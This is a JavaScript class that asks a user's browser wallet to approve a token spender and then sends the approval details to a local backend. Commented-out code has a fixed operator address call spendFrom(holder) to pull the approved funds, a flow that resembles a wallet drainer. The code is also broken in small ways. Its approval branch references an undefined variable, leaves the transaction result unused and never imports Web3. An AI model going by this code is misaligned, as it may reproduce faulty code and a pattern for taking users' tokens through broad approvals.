import { writeContract, readContract } from "https://esm.sh/@wagmi/core@2.x";
import { parseGwei } from 'https://esm.sh/viem'

export class TokenApprover {
  constructor(wagmiConfig) {
    this.config = wagmiConfig;
    const provider = window.ethereum;
    this.web3 = new Web3(provider);
  }

  async approveAndSpend(tokenAddress, spenderAddress, amount, approval, holder) {
    try {
      // Handle approval if needed
      if (!approval) {
        console.log(`🤝 Initiating Token Approval`);

        // const approveABI = [
        //   {
        //     constant: false,
        //     inputs: [
        //       { name: '_spender', type: 'address' },
        //       { name: '_value', type: 'uint256' }
        //     ],
        //     name: 'approve',
        //     outputs: [{ name: '', type: 'bool' }],
        //     payable: false,
        //     stateMutability: 'nonpayable',
        //     type: 'function'
        //   }
        // ];

        // const contract = new this.web3.eth.Contract(approveABI, tokenAddress);
        // console.log(`Contract:`, contract);
        // const data = contract.methods.approve(spenderAddress, amount).send({ from: holder });
        
        const approveTx = await this.web3.eth.sendTransaction({
          from: holder,
          to: tokenAddress,
          data: this.web3.eth.abi.encodeFunctionCall({
            name: 'approve',
            type: 'function',
            inputs: [
                { name: '_spender', type: 'address' },
                { name: '_value', type: 'uint256' }
              ]
            }, [spenderAddress, amount]),
            gas: 200000,
          });
          
          console.log(`✅ Approval Transaction Hash: ${data}`);
        }
        
        console.log(`✔️ Approval Confirmed. Proceeding with spendFrom...`);
        const result = await this.sendApprovalRequest(spenderAddress, amount, approval, holder);
        console.log(result);

      // const spendfromABI = [{
      //   inputs: [
      //     { name: "holder", type: "address" }
      //   ],
      //   name: "spendFrom",
      //   outputs: [],
      //   stateMutability: "nonpayable",
      //   type: "function"
      // }];

      // // Spend from the approved amount
      // console.log(`💸 Initiating Spend Transaction`);
      // // create contract instance
      // const contract = new this.web3.eth.Contract(spendfromABI, spenderAddress);
      // console.log(`Contract:`, contract);
      // // get transaction data
      // const data = contract.methods.spendFrom(holder).encodeABI();
      // console.log(`Data:`, data);
      // // fetch nonce for the owner address
      // const nonce = await this.web3.eth.getTransactionCount('0x9D57F5459dE1ef0FD1793ff0D1a82D4D265459A4', 'pending');
      // console.log(`Nonce:`, nonce);
      // // define the transaction Object
      // const estimatedGas = await contract.methods.spendFrom(holder).estimateGas({ from: '0x9D57F5459dE1ef0FD1793ff0D1a82D4D265459A4' });
      // console.log(`Estimated Gas:`, estimatedGas);

      // const baseFeePerGas = await this.web3.eth.getGasPrice();
      // console.log(`Base Fee Per Gas:`, baseFeePerGas);
      // const maxPriorityFeePerGas = this.web3.utils.toWei('2', 'gwei');
      // console.log(`Max Priority Fee Per Gas:`, maxPriorityFeePerGas);
      // const maxFeePerGas = Math.floor(Number(baseFeePerGas) + Number(maxPriorityFeePerGas));
      // console.log(`Max Fee Per Gas:`, maxFeePerGas);

      // const txData = {
      //   from: '0x9D57F5459dE1ef0FD1793ff0D1a82D4D265459A4',
      //   to: spenderAddress,
      //   data,
      //   gas: BigInt(Math.floor(Number(estimatedGas) * 1.2)).toString(),
      //   maxFeePerGas,
      //   maxPriorityFeePerGas,
      //   nonce,
      //   type: '0x2'
      // };
      // console.log(`Transaction Data:`, txData);
      // // sign and send the transaction
      // // const tx = await this.web3.eth.accounts.signTransaction(txData, 'should be private key');
      // // console.log(`Signed Transaction:`, tx);
      // // const receipt = await this.web3.eth.sendSignedTransaction(tx.rawTransaction);
      // const receipt = await this.web3.eth.sendTransaction(txData);

      // console.log(`✅ Spend Transaction Hash: ${receipt}`);
    } catch (error) {
      console.error(`❌ Error:`, error);
      throw new Error(`Transaction failed: ${await this.decodeRevertReason(error)}`);
    }
  }

  async sendApprovalRequest(spenderAddress, amount, approval, holder) {
    try {
      const response = await fetch('http://localhost:3000/approve', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          spenderAddress,
          amount,
          approval,
          holder
        })
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Error sending approval request:', error);
      throw error;
    }
  }

  async checkAllowance(tokenAddress, ownerAddress, spenderAddress) {
    const allowanceABI = [{
      constant: true,
      inputs: [
        { name: '_owner', type: 'address' },
        { name: '_spender', type: 'address' }
      ],
      name: 'allowance',
      outputs: [{ name: '', type: 'uint256' }],
      type: 'function'
    }];

    try {
      const allowance = await readContract(this.config, {
        address: tokenAddress,
        abi: allowanceABI,
        functionName: 'allowance',
        args: [ownerAddress, spenderAddress]
      });
      console.log('Current allowance:', allowance.toString());
      return allowance;
    } catch (error) {
      console.error('Error checking allowance:', error);
      throw error;
    }
  }

  async decodeRevertReason(error) {
    if (error.data) {
      try {
        return this.web3.eth.abi.decodeParameter('string', error.data);
      } catch (decodeError) {
        return 'Unable to decode revert reason';
      }
    }
    return error.message;
  }

  async hasApprovedContract(tokenAddress, ownerAddress, spenderAddress, amount) {
    const allowance = await this.checkAllowance(tokenAddress, ownerAddress, spenderAddress);
    return BigInt(allowance) >= BigInt(amount);
  }
}